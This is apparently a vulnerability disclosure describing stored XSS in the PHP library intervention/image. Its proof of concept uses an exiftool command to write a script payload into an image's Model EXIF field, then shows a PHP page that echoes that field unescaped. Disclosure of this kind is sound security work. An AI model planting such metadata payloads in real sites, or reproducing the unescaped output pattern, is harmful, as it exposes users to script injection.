# Description

`intervention/image` is an image handling and manipulation library. This package is vulnerable to XSS via reading the exif data from image.

# POC

1. Create a project dir in your htdocs folder
2. Install the package using composer. [here](http://image.intervention.io/getting_started/installation)
3. Create the image payload using any exiftool. But below is how I created it
```
1. Download exiftool using this tool(https://exiftool.org/)
2. Install it(https://exiftool.org/install.html)
3. Modify the image to add 'Model' key then value '<script>alert(document.domain)</script>'
4. Open terminal -> change directory to where the image is located
5. run this command 'exiftool -Model="<script>alert(document.domain)</script>" imagefilename.jpg'
6. Move it in your project root dir
```
4. Create a page.php file on your project root dir then copy and paste this code below
```
<?php
require 'vendor/autoload.php';

// import the Intervention Image Manager Class
use Intervention\Image\ImageManagerStatic as Image;

$filename = "./imagefilename.jpeg";

// read all existing data into an array
$data = Image::make($filename)->exif();

// read model of the camera
$name = Image::make($filename)->exif('Model');

echo $name;
```
5. Open terminal in your project root dir, then run command `php -S 127.0.0.1:8080`
6. Open a browser then navigate to `http://127.0.0.1:8080/page.php` to trigger the XSS payload



